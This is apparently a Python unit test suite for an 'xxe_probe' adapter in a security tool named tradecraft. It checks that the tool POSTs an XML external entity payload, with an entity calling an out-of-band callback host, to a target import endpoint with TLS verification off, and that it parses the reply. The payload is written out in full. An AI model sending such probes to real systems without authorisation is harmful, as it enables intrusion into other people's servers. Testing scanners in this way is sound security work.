from unittest.mock import patch

import requests

from tradecraft.adapters.xxe_probe.execute import XXE_PAYLOAD_TEMPLATE, RawXxeResult, execute
from tradecraft.adapters.xxe_probe.parse import POLL_NOTE, parse_xxe_result

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"}
TARGET = "https://shop.example.com/api/import"
OOB = "c0ffee123.oast.me"

EXPECTED_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE tradecraft [\n'
    '  <!ENTITY xxe SYSTEM "http://c0ffee123.oast.me/xxe-probe">\n'
    ']>\n'
    '<root>&xxe;</root>\n'
)

# Realistic response from an XML import endpoint that parsed the document and
# rejected the unknown root element (the entity may or may not have resolved).
IMPORT_400 = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<error><code>INVALID_DOCUMENT</code>'
    '<message>Unexpected root element: root. Expected one of [order, invoice].</message></error>'
)


class FakeResp:
    def __init__(self, status, text):
        self.status_code = status
        self.text = text


def test_payload_template_matches_spec_exactly():
    assert XXE_PAYLOAD_TEMPLATE.format(oob_domain=OOB) == EXPECTED_PAYLOAD


def test_exact_post_url_body_and_headers():
    with patch("tradecraft.adapters.xxe_probe.execute.requests.post", return_value=FakeResp(400, IMPORT_400)) as post:
        raw = execute(TARGET, OOB, timeout=9)

    post.assert_called_once()
    args, kwargs = post.call_args
    assert args == (TARGET,)
    assert kwargs["data"] == EXPECTED_PAYLOAD.encode("utf-8")
    assert kwargs["headers"] == {"Content-Type": "application/xml", **UA}
    assert kwargs["timeout"] == 9
    assert kwargs["verify"] is False
    assert raw.status == 400


def test_custom_content_type_is_sent():
    with patch("tradecraft.adapters.xxe_probe.execute.requests.post", return_value=FakeResp(200, "ok")) as post:
        execute(TARGET, OOB, content_type="text/xml")
    assert post.call_args.kwargs["headers"]["Content-Type"] == "text/xml"


def test_oob_domain_is_stripped_before_templating():
    with patch("tradecraft.adapters.xxe_probe.execute.requests.post", return_value=FakeResp(200, "ok")) as post:
        raw = execute(TARGET, f"  {OOB}\n")
    assert post.call_args.kwargs["data"] == EXPECTED_PAYLOAD.encode("utf-8")
    assert raw.oob_domain == OOB


def test_missing_target_or_oob_domain_is_error_without_request():
    with patch("tradecraft.adapters.xxe_probe.execute.requests.post") as post:
        assert execute("", OOB).error == "target is required"
        assert execute(TARGET, "   ").error == "oob_domain is required"
    post.assert_not_called()


def test_request_exception_is_reported_as_error():
    with patch(
        "tradecraft.adapters.xxe_probe.execute.requests.post",
        side_effect=requests.ConnectionError("connection refused"),
    ):
        raw = execute(TARGET, OOB)
    assert raw.error == "connection refused"
    assert parse_xxe_result(raw) == {"target": TARGET, "error": "connection refused"}


def test_parse_reports_status_snippet_and_poll_note_without_claiming_success():
    with patch("tradecraft.adapters.xxe_probe.execute.requests.post", return_value=FakeResp(400, IMPORT_400)):
        out = parse_xxe_result(execute(TARGET, OOB))
    assert out == {
        "target": TARGET,
        "oob_domain": OOB,
        "status": 400,
        "body_snippet": IMPORT_400,
        "note": POLL_NOTE,
    }
    assert "vulnerable" not in out and "hit" not in out


def test_parse_truncates_body_snippet_to_500_chars():
    long_body = "A" * 2000
    with patch("tradecraft.adapters.xxe_probe.execute.requests.post", return_value=FakeResp(200, long_body)):
        raw = execute(TARGET, OOB)
    assert len(raw.body_snippet) == 500


def test_parse_error_passthrough():
    assert parse_xxe_result(RawXxeResult(target="t", oob_domain="d", error="x")) == {"target": "t", "error": "x"}
